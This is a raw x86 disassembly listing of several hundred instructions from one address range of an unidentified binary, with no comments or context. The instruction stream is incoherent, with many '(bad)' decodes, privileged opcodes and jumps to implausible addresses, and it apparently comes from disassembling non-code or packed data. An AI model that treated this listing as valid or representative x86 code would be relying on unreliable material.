  41706d:	fstp   TBYTE PTR [ebp-0x30614706]
  417073:	aas    
  417074:	mov    ds:0x78263346,eax
  417079:	sub    eax,0x6cd642b9
  41707e:	push   0x30
  417080:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417081:	retf   0x6eb1
  417084:	cwde   
  417085:	pop    esi
  417086:	pop    ss
  417087:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417088:	std    
  417089:	cmp    BYTE PTR [ebx],dl
  41708b:	xchg   esi,eax
  41708c:	leave  
  41708d:	inc    ecx
  41708e:	hlt    
  41708f:	mov    bh,0x1e
  417091:	fs addr16 push ebp
  417094:	jmp    0x417030
  417096:	out    0x26,al
  417098:	lods   al,BYTE PTR ds:[esi]
  417099:	pop    eax
  41709a:	fdivr  QWORD PTR [ecx+0x692d1740]
  4170a0:	jae    0x417090
  4170a2:	into   
  4170a3:	rcl    DWORD PTR [eax+0x4c56919],0xd3
  4170aa:	enter  0xeedf,0x6e
  4170ae:	aad    0xa4
  4170b0:	cdq    
  4170b1:	je     0x4170c1
  4170b3:	rol    BYTE PTR [ebp-0x1078f5bf],0xa4
  4170ba:	push   esi
  4170bb:	cld    
  4170bc:	mov    edi,0x5e09d596
  4170c1:	mov    esi,0x6abde498
  4170c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4170c7:	adc    al,0x36
  4170c9:	cmp    BYTE PTR gs:[edx-0x29],dh
  4170cd:	xchg   esp,eax
  4170ce:	sti    
  4170cf:	inc    ecx
  4170d0:	push   0xffffff8f
  4170d2:	sub    BYTE PTR [edi],bh
  4170d4:	jns    0x4170a3
  4170d6:	rcl    DWORD PTR [edx],0xa4
  4170d9:	das    
  4170da:	and    BYTE PTR [eax+eax*4-0x5a],dl
  4170de:	jmp    DWORD PTR ds:0x95c3ae8c
  4170e4:	fld    QWORD PTR [eax]
  4170e6:	inc    ebp
  4170e7:	dec    ecx
  4170e8:	jecxz  0x4170e3
  4170ea:	rcl    BYTE PTR [ebp-0x1713b337],cl
  4170f0:	jle    0x4170f3
  4170f2:	xchg   edx,eax
  4170f3:	imul   ebx,DWORD PTR ss:[esi+0x6],0x4e
  4170f8:	aaa    
  4170f9:	pop    esp
  4170fa:	(bad)  
  4170fb:	jle    0x417165
  4170fd:	mov    edx,0x1aea80ff
  417102:	adc    edx,esp
  417104:	sahf   
  417105:	call   0xf211af59
  41710a:	lahf   
  41710b:	mov    eax,ds:0x9d9642b3
  417110:	daa    
  417111:	and    dh,ah
  417113:	mov    ebp,0x2e7bc9a8
  417118:	fs xchg esp,eax
  41711a:	imul   eax,DWORD PTR [ebx+eiz*1-0xa],0x2a
  41711f:	mov    ds:0x8b40ffdd,eax
  417124:	shl    BYTE PTR [eax+edi*1-0x7bbf3510],1
  41712b:	outs   dx,DWORD PTR ds:[esi]
  41712c:	into   
  41712d:	jo     0x417156
  41712f:	repz cli 
  417131:	shl    DWORD PTR [esi],0x35
  417134:	fucomi st,st(3)
  417136:	stc    
  417137:	dec    ecx
  417138:	mov    al,bl
  41713a:	mov    bl,0x8e
  41713c:	and    ebx,0x3d
  41713f:	cmp    eax,esi
  417141:	mov    es,WORD PTR [ebx-0x592c5049]
  417147:	xchg   ecx,eax
  417148:	das    
  417149:	fwait
  41714a:	into   
  41714b:	mov    edi,0x7c3acebf
  417150:	outs   dx,DWORD PTR ds:[esi]
  417151:	cmp    esi,DWORD PTR [edx]
  417153:	jmp    0x417127
  417155:	mov    esp,0x64f89bac
  41715a:	mov    edi,0x920ec9e4
  41715f:	dec    ebp
  417160:	ss lock into 
  417163:	iret   
  417164:	xchg   ecx,eax
  417165:	std    
  417166:	sbb    eax,0x86751a4c
  41716b:	cld    
  41716c:	push   ss
  41716d:	in     al,0xc4
  41716f:	mov    cl,0x98
  417171:	test   eax,0x7c75e03b
  417176:	mov    dl,0x54
  417178:	gs scas al,BYTE PTR es:[edi]
  41717a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41717b:	cmp    edx,0x3255d223
  417181:	gs cmp al,0x70
  417184:	jle    0x4171a3
  417186:	ss mov ebx,0xba026c00
  41718c:	push   ebx
  41718d:	jne    0x4171e0
  41718f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417190:	enter  0x1cdf,0x5e
  417194:	(bad)
  417197:	cmp    dl,BYTE PTR [edx-0x32bc7d26]
  41719d:	cmc    
  41719e:	mov    ds:0x5d37d1d,al
  4171a3:	push   es
  4171a4:	out    dx,eax
  4171a5:	cmp    edx,DWORD PTR [ebx]
  4171a7:	add    eax,0x83ef3d42
  4171ac:	push   es
  4171ad:	stos   BYTE PTR es:[edi],al
  4171ae:	xchg   esi,eax
  4171af:	cwde   
  4171b0:	mov    edi,0x22e77e8c
  4171b5:	scas   eax,DWORD PTR es:[edi]
  4171b6:	out    0x9a,al
  4171b8:	scas   eax,DWORD PTR es:[edi]
  4171b9:	test   edx,eax
  4171bb:	pushf  
  4171bc:	out    dx,eax
  4171bd:	inc    ebp
  4171be:	lods   eax,DWORD PTR ds:[esi]
  4171bf:	bound  esp,QWORD PTR [ecx-0x27448d50]
  4171c5:	push   esi
  4171c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4171c7:	in     al,dx
  4171c8:	pop    ds
  4171c9:	retf   
  4171ca:	push   ebp
  4171cb:	ja     0x41720d
  4171cd:	lods   al,BYTE PTR ds:[esi]
  4171ce:	mov    eax,ds:0x26c964a6
  4171d3:	xor    DWORD PTR [ebx*4-0x71f1a69e],0x5a
  4171db:	or     al,0x2b
  4171dd:	mov    ecx,0xdba03735
  4171e2:	and    bl,dh
  4171e4:	pop    si
  4171e6:	(bad)  
  4171e8:	cmp    al,0xff
  4171ea:	pusha  
  4171eb:	call   FWORD PTR [edi+esi*1]
  4171ee:	lods   al,BYTE PTR ds:[esi]
  4171ef:	sti    
  4171f0:	andnps xmm1,XMMWORD PTR [esi+0x1f]
  4171f4:	and    edi,DWORD PTR [eiz*4+0x2abe76f3]
  4171fb:	in     al,0x85
  4171fd:	jae    0x41719a
  4171ff:	imul   esp,DWORD PTR [ebx+eax*1],0x76
  417203:	sub    DWORD PTR [ebx+0x1cf35132],ebx
  417209:	js     0x417225
  41720b:	aas    
  41720c:	jno    0x4171b1
  41720e:	pop    ds
  41720f:	out    0x1d,al
  417211:	adc    eax,DWORD PTR [edx]
  417213:	andnps xmm6,XMMWORD PTR [edx+edi*4]
  417217:	outs   dx,DWORD PTR fs:[esi]
  417219:	dec    edx
  41721a:	inc    edi
  41721b:	pop    ds
  41721c:	push   esp
  41721d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41721e:	xor    DWORD PTR [edi],eax
  417220:	into   
  417221:	xchg   ebx,esp
  417223:	pusha  
  417224:	sahf   
  417225:	lods   al,BYTE PTR ds:[esi]
  417226:	pushw  cs
  417228:	jo     0x41723a
  41722a:	jg     0x41722c
  41722c:	xor    al,0x15
  41722e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41722f:	push   edx
  417230:	mov    esi,0x4065fde4
  417235:	xchg   ebx,eax
  417236:	xchg   edx,eax
  417237:	pop    ds
  417238:	in     al,dx
  417239:	jns    0x4172aa
  41723b:	push   esi
  41723c:	mov    al,ds:0x9cefa53b
  417241:	fcom   QWORD PTR [eax-0xf]
  417244:	jns    0x4172c0
  417246:	loope  0x417233
  417248:	push   edx
  417249:	xchg   esi,eax
  41724a:	mov    WORD PTR [esi],gs
  41724c:	and    cl,BYTE PTR [ecx+ebp*2+0x18]
  417250:	cdq    
  417251:	and    eax,DWORD PTR [esi+0x6ba9b3c2]
  417257:	loop   0x4172c1
  417259:	bound  eax,QWORD PTR [edi]
  41725b:	mov    ds:0x8dd1ebc1,eax
  417260:	(bad)  
  417262:	fcos   
  417264:	pop    esp
  417265:	cmp    eax,0xde290c20
  41726a:	hlt    
  41726b:	es cli 
  41726d:	jle    0x417266
  41726f:	adc    DWORD PTR [edx+0x1a],esi
  417272:	clc    
  417273:	(bad)  
  417274:	pop    ss
  417275:	dec    ebx
  417276:	sar    ebp,cl
  417278:	push   edx
  417279:	fadd   st(3),st
  41727b:	int3   
  41727c:	sbb    ebx,DWORD PTR [edx-0xd751f26]
  417282:	jae    0x417247
  417284:	sbb    eax,0x2fad911d
  417289:	lea    ebp,[ecx]
  41728b:	mov    dl,0xab
  41728d:	into   
  41728e:	scas   eax,DWORD PTR es:[edi]
  41728f:	sbb    esp,DWORD PTR [ebp+edx*4-0x48944f2c]
  417296:	jle    0x4172ea
  417298:	pop    eax
  417299:	mov    ebx,0xff70ed4e
  41729e:	pop    ebx
  41729f:	test   DWORD PTR [esi-0x4],esi
  4172a2:	push   ss
  4172a3:	cmp    bh,BYTE PTR [eax]
  4172a5:	lock mov ecx,0x57486959
  4172ab:	imul   edi,DWORD PTR [ecx],0xffffff95
  4172ae:	mov    eax,ds:0xeb702f71
  4172b3:	ss mov esp,0xbbaa4774
  4172b9:	add    BYTE PTR [esi],dh
  4172bb:	inc    ecx
  4172bc:	rol    BYTE PTR [esi-0x3c83da4d],1
  4172c2:	lods   eax,DWORD PTR ds:[esi]
  4172c3:	sbb    al,0x50
  4172c5:	in     al,dx
  4172c6:	pop    esp
  4172c7:	adc    BYTE PTR [ecx+eiz*8+0x69],bl
  4172cb:	dec    edx
  4172cc:	mov    ebp,0xe427fa5f
  4172d1:	dec    esp
  4172d2:	mov    bl,0x61
  4172d4:	loope  0x4172e8
  4172d6:	test   eax,0x1ad92818
  4172db:	mov    ecx,0xacfa8bdb
  4172e0:	xchg   ebp,eax
  4172e1:	lock cmps BYTE PTR es:[esi],BYTE PTR es:[edi]
  4172e4:	jns    0x417327
  4172e6:	and    ch,ah
  4172e8:	sbb    eax,0x1e2b8c8c
  4172ed:	xchg   esi,eax
  4172ee:	lock xchg ebp,eax
  4172f0:	repz pop ecx
  4172f2:	mov    ecx,0x97bbc69c
  4172f7:	test   BYTE PTR [edi+0x6b75c269],cl
  4172fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4172fe:	sbb    al,0x1e
  417300:	cmp    BYTE PTR [esi+0x4a],ch
  417303:	pop    esp
  417304:	psubw  mm0,QWORD PTR [ebx]
  417307:	inc    ebx
  417308:	and    eax,0x1a074a6b
  41730d:	(bad)  [eax-0x1b7dcce3]
  417313:	xor    eax,0x11223fb3
  417318:	cmc    
  417319:	and    ebp,DWORD PTR [esi]
  41731b:	push   0xffffffe0
  41731d:	inc    ecx
  41731e:	pusha  
  41731f:	xor    al,0x65
  417321:	fist   DWORD PTR [ecx]
  417323:	mov    eax,ds:0xf5911305
  417328:	mov    bh,0x41
  41732a:	sub    DWORD PTR [ebx],esi
  41732c:	cmp    cl,al
  41732e:	or     dh,BYTE PTR [eax-0x2d]
  417331:	ins    BYTE PTR es:[edi],dx
  417332:	jbe    0x417317
  417334:	inc    edx
  417335:	or     eax,0xd6f6e1a7
  41733a:	ins    BYTE PTR es:[edi],dx
  41733b:	gs xchg esp,eax
  41733d:	add    BYTE PTR [ebp+0x591807ea],0x68
  417344:	in     al,0x24
  417346:	add    DWORD PTR [edx+0x3f7ae16e],edx
  41734c:	xor    DWORD PTR [ebx-0x685acc80],ecx
  417352:	pushf  
  417353:	dec    esi
  417354:	mov    esp,0xa057a09e
  417359:	(bad)
  41735c:	and    ch,BYTE PTR [ebp-0x2a]
  41735f:	inc    edx
  417360:	dec    edx
  417361:	mov    esi,0xd274c1f9
  417366:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417367:	pop    ecx
  417368:	inc    edi
  417369:	repnz data16 sahf 
  41736c:	dec    edi
  41736d:	sbb    al,cl
  41736f:	scas   eax,DWORD PTR es:[edi]
  417370:	stos   BYTE PTR es:[edi],al
  417371:	fwait
  417372:	mov    al,ds:0xfe2511c0
  417377:	mov    es,WORD PTR [ecx-0x16]
  41737a:	arpl   WORD PTR [ebp+0x15783ade],si
  417380:	add    al,BYTE PTR [ecx]
  417382:	popf   
  417383:	sbb    eax,0x6ea91fc
  417388:	or     al,0xd1
  41738a:	scas   al,BYTE PTR es:[edi]
  41738b:	pusha  
  41738c:	std    
  41738d:	pop    esi
  41738e:	out    dx,al
  41738f:	jg     0x4173db
  417391:	not    BYTE PTR [esi]
  417393:	and    ecx,DWORD PTR [ebp+0x11]
  417396:	int    0x6
  417398:	cmp    dh,dh
  41739a:	cmp    al,0x5c
  41739c:	cmp    dh,BYTE PTR [eax]
  41739e:	loopne 0x4173aa
  4173a0:	mov    dh,0xdc
  4173a2:	jo     0x41738d
  4173a4:	cmp    al,0xe2
  4173a6:	inc    edi
  4173a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4173a8:	or     al,0xcc
  4173aa:	out    0xe7,eax
  4173ac:	rcl    BYTE PTR [ebp-0x52],cl
  4173af:	cdq    
  4173b0:	jle    0x4173d1
  4173b2:	add    DWORD PTR [esi-0x688dd1bd],ecx
  4173b8:	js     0x417379
  4173ba:	ror    BYTE PTR [edx],0x27
  4173bd:	or     dh,BYTE PTR [esi-0x49]
  4173c0:	bound  ebx,QWORD PTR [esp+edi*2]
  4173c3:	repnz rcl BYTE PTR gs:[esi+0x19176702],cl
  4173cb:	sub    ecx,DWORD PTR [ecx+0x5a]
  4173ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4173cf:	push   0xfffffff7
  4173d1:	pop    eax
  4173d2:	test   al,0x67
  4173d4:	pop    edi
  4173d5:	outs   dx,DWORD PTR ds:[esi]
  4173d6:	or     cl,BYTE PTR [eax-0xb]
  4173d9:	fmul   DWORD PTR [edi-0x3e6f97a5]
  4173df:	cli    
  4173e0:	mov    ss,WORD PTR [ecx]
  4173e2:	dec    ebp
  4173e3:	ret    
  4173e4:	popa   
  4173e5:	push   ebx
  4173e6:	add    al,0x1c
  4173e8:	cmp    eax,0x69d96a9b
  4173ed:	imul   ebp,DWORD PTR [ebx],0x81ef7ab7
  4173f3:	mov    al,ds:0xc391c629
  4173f8:	mov    ?,WORD PTR [ecx]
  4173fa:	sbb    eax,0x197e9ec5
  4173ff:	sbb    dh,BYTE PTR [ebx+0x2f]
  417402:	add    eax,0xbc363258
  417407:	xor    al,0xc8
  417409:	mov    esp,0x6d3c3af8
  41740e:	push   ss
  41740f:	xor    DWORD PTR cs:[ebp+0x23333ae5],esp
  417416:	inc    ebx
  417417:	xchg   edx,eax
  417418:	mov    ebp,0xedf0881e
  41741d:	xchg   esi,eax
  41741e:	data16 int3 
  417420:	stos   DWORD PTR es:[edi],eax
  417421:	stos   BYTE PTR es:[edi],al
  417422:	pop    edi
  417423:	or     al,0x75
  417425:	mov    al,0xc4
  417427:	ins    BYTE PTR es:[edi],dx
  417428:	mov    al,0x9c
  41742a:	cmp    al,0xd8
  41742c:	xor    ecx,DWORD PTR [eax-0x1f5e23ab]
  417432:	pop    ecx
  417433:	xchg   DWORD PTR [edx+0x3b],esp
  417436:	lock icebp 
  417438:	mov    al,ds:0xd176a88f
  41743d:	add    ch,BYTE PTR [ecx-0x5521b22a]
  417443:	gs jle 0x4173d2
  417446:	test   DWORD PTR [ebp+0x40],ecx
  417449:	daa    
  41744a:	pop    es
  41744b:	xchg   ebp,eax
  41744c:	sbb    eax,0xeb974e4b
  417451:	scas   eax,DWORD PTR es:[edi]
  417452:	add    al,0x25
  417454:	ins    DWORD PTR es:[edi],dx
  417455:	jns    0x41749f
  417457:	sub    esi,DWORD PTR [eax]
  417459:	sbb    eax,0xab5df5
  41745e:	cmp    ch,BYTE PTR ds:0xe05cca51
  417464:	adc    BYTE PTR [eax+0x2874db5c],dh
  41746a:	cmp    eax,0x12029fc9
  41746f:	in     eax,0x5a
  417471:	push   eax
  417472:	icebp  
  417473:	jne    0x417469
  417475:	mov    edx,0xba7839ea
  41747a:	push   eax
  41747b:	iret   
  41747c:	sbb    esi,DWORD PTR ds:0x60df3b58
  417482:	mov    ah,BYTE PTR [ebp+0x30]
  417485:	sub    eax,0xef457603
  41748a:	scas   eax,DWORD PTR es:[edi]
  41748b:	ret    0xae66
  41748e:	(bad)  
  41748f:	rcl    DWORD PTR ds:[edx+ebp*8-0x6b],cl
  417494:	fisub  WORD PTR [eax]
  417496:	aad    0xb
  417498:	mov    bh,0x6e
  41749a:	add    cl,ah
  41749c:	mov    ds,WORD PTR [edi]
  41749e:	sub    eax,0x3b114ebe
  4174a3:	dec    eax
  4174a4:	call   0xe5193dfc
  4174a9:	and    ch,BYTE PTR [ebx-0x80]
  4174ac:	or     al,0x3a
  4174ae:	inc    edx
  4174af:	clc    
  4174b0:	jecxz  0x4174b4
  4174b2:	mov    ecx,edx
  4174b4:	xchg   BYTE PTR [eax-0x628f2c98],cl
  4174ba:	repz mov ebx,0xa1c2f54e
  4174c0:	sbb    esi,DWORD PTR [eax]
  4174c2:	adc    BYTE PTR [eax],dh
  4174c4:	cli    
  4174c5:	test   DWORD PTR [eax],ecx
  4174c7:	inc    ebx
  4174c8:	jle    0x4174a1
  4174ca:	add    esi,DWORD PTR [ebx+0x4]
  4174cd:	mov    gs,WORD PTR [ebp-0x63078214]
  4174d3:	add    eax,0xed224148
  4174d8:	push   ecx
  4174d9:	pmaxsw mm6,QWORD PTR [edx-0x4a]
  4174dd:	sti    
  4174de:	inc    esi
  4174df:	rol    DWORD PTR [edx-0x38919236],1
  4174e5:	call   0xa9f1:0x48c20be
  4174ec:	cmp    eax,0x52ab7ad5
  4174f1:	mov    esp,0xdb1e7e84
  4174f6:	in     eax,dx
  4174f7:	cmp    ah,cl
  4174f9:	ficom  WORD PTR [ebp-0x14]
  4174fc:	jns    0x41747e
  4174fe:	add    cl,0x77
  417501:	mov    ecx,0x31b30924
  417506:	jb     0x417517
  417508:	lea    edx,[ebx-0x1e]
  41750b:	and    ecx,DWORD PTR [ebp-0x4c9b9932]
  417511:	mov    eax,0x1a37f665
  417516:	es retf 0xc4d2
  41751a:	mov    bh,0x63
  41751c:	inc    edi
  41751d:	dec    eax
  41751e:	or     DWORD PTR ds:0x5f6d040c,esp
  417524:	push   esi
  417525:	repz mov al,ds:0xdd3e7389
  41752b:	bnd jmp 0x4174c2
  41752e:	aad    0x69
  417530:	invd   
  417532:	loop   0x41757e
  417534:	pop    ebp
  417535:	xchg   esp,eax
  417536:	js     0x4174e5
  417538:	js     0x417575
  41753a:	pop    ds
  41753b:	adc    al,BYTE PTR [ebp+0x78c41341]
  417541:	and    ecx,0xbde19cc1
  417547:	mov    ebx,0x330573e7
  41754c:	pop    edi
  41754d:	test   al,0x6e
  41754f:	adc    bl,0x11
  417552:	imul   eax,DWORD PTR [edi-0x29],0x86e8049f
  417559:	rcr    ch,1
  41755b:	push   edx
  41755c:	call   0x4a7c:0x8bcda430
  417563:	icebp  
  417564:	dec    edi
  417565:	add    ecx,DWORD PTR [ebx-0x62]
  417568:	cli    
  417569:	xchg   edx,eax
  41756a:	aaa    
  41756b:	adc    DWORD PTR [ecx],eax
  41756d:	pop    esi
  41756e:	pop    edi
  41756f:	xor    al,0xf6
  417571:	cmp    BYTE PTR [ebp+0x5a],al
  417574:	pop    esi
  417575:	leave  
  417576:	or     DWORD PTR [ecx+0x78],esi
  417579:	sub    BYTE PTR [esi+0x6512d360],bh
  41757f:	je     0x417596
  417581:	adc    DWORD PTR [ebx-0x26],esi
  417584:	xchg   ebx,eax
  417585:	lock loopne 0x417555
  417588:	ins    DWORD PTR es:[edi],dx
  417589:	add    ah,dl
  41758b:	and    al,0xdc
  41758d:	stc    
  41758e:	ss hlt 
  417590:	imul   ebp
  417592:	sub    ebp,DWORD PTR [edi+0x39c7d627]
  417598:	loope  0x417572
  41759a:	dec    ebp
  41759b:	mov    ch,0x87
  41759d:	mov    ebp,ebx
  41759f:	sub    eax,0x582dc963
  4175a4:	cmc    
  4175a5:	xchg   edx,eax
  4175a6:	call   0xebebea7e
  4175ab:	cmp    bh,ch
  4175ad:	xor    eax,esi
  4175af:	push   es
  4175b0:	sub    DWORD PTR [edx],esp
  4175b2:	and    al,0x80
  4175b4:	inc    ebp
  4175b5:	out    dx,eax
  4175b6:	fwait
  4175b7:	pushf  
  4175b8:	cmp    al,0x71
  4175ba:	xchg   DWORD PTR [eax+0x3],edi
  4175bd:	sahf   
  4175be:	dec    ebp
  4175bf:	push   edi
  4175c0:	fcmovnu st,st(1)
  4175c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4175c3:	push   0xffffffe8
  4175c5:	call   0x80e9dd43
  4175ca:	mov    edx,0x38e7805c
  4175cf:	rol    DWORD PTR [esi],cl
  4175d1:	or     BYTE PTR [esi],0xb0
  4175d4:	loopne 0x417639
  4175d6:	adc    BYTE PTR [ecx],cl
  4175d8:	sbb    ah,BYTE PTR [ecx]
  4175da:	jne    0x41757f
  4175dc:	inc    edx
  4175dd:	repz xchg edx,eax
  4175df:	out    0x36,eax
  4175e1:	jl     0x41758b
  4175e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4175e4:	inc    ebp
  4175e5:	cmp    al,al
  4175e7:	jnp    0x417654
  4175e9:	push   esp
  4175ea:	jmp    0x87a66541
  4175ef:	daa    
  4175f0:	pop    ss
  4175f1:	stos   BYTE PTR es:[edi],al
  4175f2:	iret   
  4175f3:	arpl   WORD PTR [eax+ebx*2+0x4e362550],si
  4175fa:	cs (bad) 
  4175fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4175fd:	jno    0x41762e
  4175ff:	adc    BYTE PTR [ecx+eax*4+0x63],ch
  417603:	inc    esp
  417604:	call   0x33417e4f
  417609:	jno    0x4175f8
  41760b:	test   eax,0xb8bce212
  417610:	mov    edi,0xbcecb85a
  417615:	sahf   
  417616:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417617:	adc    ebp,ebx
  417619:	xchg   edi,eax
  41761a:	jmp    0x417617
  41761c:	(bad)  
  41761e:	mov    ah,al
  417620:	outs   dx,BYTE PTR ds:[esi]
  417621:	pop    ds
  417622:	jns    0x4175ba
  417624:	in     eax,dx
  417625:	xchg   ecx,eax
  417626:	ds loopne 0x4175f4
  417629:	mov    WORD PTR [esi-0x3e],?
  41762c:	aam    0x85
  41762e:	adc    al,0xb3
  417630:	daa    
  417631:	mov    bl,0x56
  417633:	pop    esp
  417634:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417635:	push   es
  417636:	xor    eax,0x70cf16fb
  41763b:	fwait
  41763c:	inc    esp
  41763d:	pop    esi
  41763e:	push   eax
  41763f:	inc    edi
  417640:	mov    eax,0xa341234a
  417645:	and    eax,0x633eed2f
  41764a:	lods   eax,DWORD PTR ds:[esi]
  41764b:	push   ebx
  41764c:	sar    al,0x64
  41764f:	call   0xb457:0x6d480303
  417656:	push   cs
  417657:	cs jo  0x4175f1
  41765a:	jmp    0x4175fa
  41765c:	xchg   edx,eax
  41765d:	mov    edx,0x388ac118
  417662:	xchg   esp,eax
  417663:	push   ebp
  417664:	and    ebp,ebp
  417666:	in     al,dx
  417667:	lock dec eax
  417669:	pop    edx
  41766a:	sub    cl,dh
  41766c:	ret    0x2474
  41766f:	xor    al,0xae
  417671:	test   al,0x5e
  417673:	xor    edi,DWORD PTR [eax]
  417675:	fs daa 
  417677:	sahf   
  417678:	push   ds
  417679:	jb     0x41769f
  41767b:	in     eax,0x7f
  41767d:	inc    edx
  41767e:	mov    dl,0xa6
  417680:	cld    
  417681:	dec    esp
  417682:	push   ebp
  417683:	dec    edx
  417684:	stos   BYTE PTR es:[edi],al
  417685:	(bad)  
  417686:	out    dx,eax
  417687:	xor    al,0x42
  417689:	push   es
  41768a:	shr    DWORD PTR [edx+0xf],0x93
  41768e:	push   esp
  41768f:	cld    
  417690:	std    
  417691:	jle    0x4176bf
  417693:	or     edx,DWORD PTR [eax]
  417695:	fadd   DWORD PTR [ebx]
  417697:	pop    edi
  417698:	mov    edx,0xe62e3dcb
  41769d:	inc    eax
  41769e:	dec    cl
  4176a0:	fs out 0x15,al
  4176a3:	clc    
  4176a4:	and    bl,BYTE PTR [ebx]
  4176a6:	sahf   
  4176a7:	fcom   DWORD PTR [edx]
  4176a9:	add    BYTE PTR [edi-0x6],0xb7
  4176ad:	out    dx,al
  4176ae:	sahf   
  4176af:	mov    ebp,0xfc2783ba
  4176b4:	push   0x43
  4176b6:	clc    
  4176b7:	mov    eax,ds:0x75721857
  4176bc:	lods   eax,DWORD PTR ds:[esi]
  4176bd:	and    DWORD PTR [esi],esp
  4176bf:	mov    ds:0xf1196a0a,al
  4176c4:	daa    
  4176c5:	jecxz  0x4176e9
  4176c7:	leave  
  4176c8:	add    BYTE PTR [eax+0xf],ch
  4176cb:	cmp    cl,BYTE PTR [edi+0x7b]
  4176ce:	(bad)  [ebx+0x2b]
  4176d1:	jo     0x417666
  4176d3:	leave  
  4176d4:	add    dl,bh
  4176d6:	into   
  4176d7:	xor    BYTE PTR [ecx],ch
  4176d9:	or     edi,DWORD PTR [ebp-0x4812746c]
  4176df:	inc    edi
  4176e0:	icebp  
  4176e1:	fld    DWORD PTR [eax+esi*1+0x13]
  4176e5:	sub    al,0xef
  4176e7:	fucomp st(6)
  4176e9:	push   ss
  4176ea:	push   ebp
  4176eb:	nop
  4176ec:	ins    BYTE PTR es:[edi],dx
  4176ed:	jmp    0x7ccc:0xf0d1f17a
  4176f4:	jns    0x4176be
  4176f6:	jle    0x41776f
  4176f8:	inc    esp
  4176f9:	mov    eax,ds:0x5c15f544
  4176fe:	test   eax,0x71fd9512
  417703:	shl    DWORD PTR [edi+eiz*2],cl
  417706:	hlt    
  417707:	lods   al,BYTE PTR ds:[esi]
  417708:	cmp    al,0xc1
  41770a:	push   ax
  41770c:	(bad)  
  41770e:	loop   0x4176b5
  417710:	es mov edi,ebp
  417713:	jecxz  0x4176dc
  417715:	xchg   ebx,eax
  417716:	scas   eax,DWORD PTR es:[edi]
  417717:	lahf   
  417718:	xor    DWORD PTR [edx+0x3c7f395e],0x78
  41771f:	pop    eax
  417720:	mov    ecx,0x61fffe19
  417725:	hlt    
  417726:	cmp    al,0xce
  417728:	xor    esi,esp
  41772a:	fdiv   DWORD PTR [ebp+0xe]
  41772d:	call   FWORD PTR [ebx+0x75]
  417730:	dec    esp
  417731:	cld    
  417732:	mov    al,ds:0x8d2c2eeb
  417737:	mov    edx,0xa6a6881c
  41773c:	inc    edx
  41773d:	out    dx,eax
  41773e:	xchg   ecx,eax
  41773f:	fsubr  st(0),st
  417741:	js     0x4176f2
  417743:	inc    edi
  417744:	daa    
  417745:	aad    0x33
  417747:	push   esi
  417748:	jno    0x417744
  41774a:	(bad)  
  41774b:	out    dx,al
  41774c:	retf   0xeebe
  41774f:	xchg   BYTE PTR [ebx],bl
  417751:	and    al,0x54
  417753:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417754:	loop   0x4177a3
  417756:	in     al,0xfc
  417758:	jecxz  0x41770f
  41775a:	rcl    DWORD PTR [eax+0x44],0xcc
  41775e:	in     al,dx
  41775f:	clc    
  417760:	fst    DWORD PTR [edi-0x71]
  417763:	enter  0x85d8,0x5a
  417767:	mov    al,0xfc
  417769:	cmp    al,0xbb
  41776b:	cmp    al,0x7c
  41776d:	cmp    al,0x7e
  41776f:	xchg   al,ah
  417771:	xchg   ebp,eax
  417772:	cmp    esp,esi
  417774:	lods   eax,DWORD PTR ds:[esi]
  417775:	jb     0x417752
  417777:	mov    al,0x31
  417779:	jg     0x417737
  41777b:	out    dx,al
  41777c:	push   ds
  41777d:	cmp    al,0xab
  41777f:	or     al,0x68
  417781:	or     DWORD PTR [edi],edx
  417783:	adc    esi,DWORD PTR [ebp+0x0]
  417786:	ret    
  417787:	pop    ebx
  417788:	mov    ecx,DWORD PTR [ecx+0x53]
  41778b:	mov    eax,ds:0xa47a2471
  417790:	not    BYTE PTR [ebx]
  417792:	jl     0x4177d4
  417794:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417795:	or     dh,cl
  417797:	mov    ds:0xad755dd7,eax
  41779c:	sar    BYTE PTR [edi+edx*1],0xa3
  4177a0:	adc    DWORD PTR [ebx],esi
  4177a2:	int    0xbd
  4177a4:	pop    ss
  4177a5:	adc    eax,0x5a918ccf
  4177aa:	or     DWORD PTR [edx-0x6940b248],eax
  4177b0:	gs cdq 
  4177b2:	repz hlt 
  4177b4:	push   edx
  4177b5:	or     DWORD PTR [ecx+0x59],0xc751062a
  4177bc:	and    BYTE PTR [eax+0x39],dl
  4177bf:	add    edi,ecx
  4177c1:	test   eax,0x1ba7cea
  4177c6:	mov    ch,dl
  4177c8:	adc    edi,0x4c
  4177cb:	retf   0x629e
  4177ce:	push   0xecc340ee
  4177d3:	retf   0x398d
  4177d6:	jmp    0x4177c3
  4177d8:	xor    eax,0x526031b2
  4177dd:	cwde   
  4177de:	sub    ecx,DWORD PTR [ebp-0x24]
  4177e1:	mov    edi,0x8c71b3ec
  4177e6:	sti    
  4177e7:	clc    
  4177e8:	mov    WORD PTR [esi-0x1d],ss
  4177eb:	add    eax,0x91d3e90c
  4177f0:	xor    ecx,DWORD PTR [esi+0x6a]
  4177f3:	in     al,0xc4
  4177f5:	iret   
  4177f6:	fisubr WORD PTR ds:0x7b039290
  4177fc:	mov    eax,0x32efefb2
  417801:	xsavec [esi+0x50]
  417805:	mov    BYTE PTR [esi],ch
  417807:	mov    ebp,0x96d5e6ee
  41780c:	cmp    DWORD PTR [ecx],ebx
  41780e:	jmp    0xdbbcbe6e
  417813:	jae    0x4177e3
  417815:	ins    DWORD PTR es:[edi],dx
  417816:	sbb    al,0x5
  417818:	xor    eax,0x46098d30
  41781d:	or     eax,0x3bd6fe23
  417822:	push   0xae4e5169
